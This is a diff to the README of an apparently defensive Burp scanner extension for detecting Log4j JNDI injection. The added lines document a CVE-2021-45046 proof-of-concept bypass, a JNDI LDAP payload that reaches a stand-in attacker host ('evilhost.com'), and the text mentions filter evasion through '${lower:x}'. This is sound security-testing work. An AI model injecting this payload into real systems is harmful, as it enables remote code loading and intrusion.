@@ -3,3 +3,7 @@ This is a simple fork of James Kettle's excellent [Collaborator Everywhere](http
 To avoid false positives with pingbacks such as with DNS requests made from host regex matching, and to potentially bypass filters, the `${lower:x}` pattern is used in the DNS request to establish confidence that there is some kind of of jdni lookup happening - if this matches, it will set the confidence to certain. 
 
 To use it, simply install it and browse the target website. Findings will be presented in the 'Issues' tab. You can easily customise injected payloads by editing /resources/injections
+
+# CVE-2021-45046
+Added PoC bypass for allowedLdapHost and allowedClassess checks in Log4J 2.15.0:
+- ${jndi:ldap://127.0.0.1#evilhost.com:443/a}
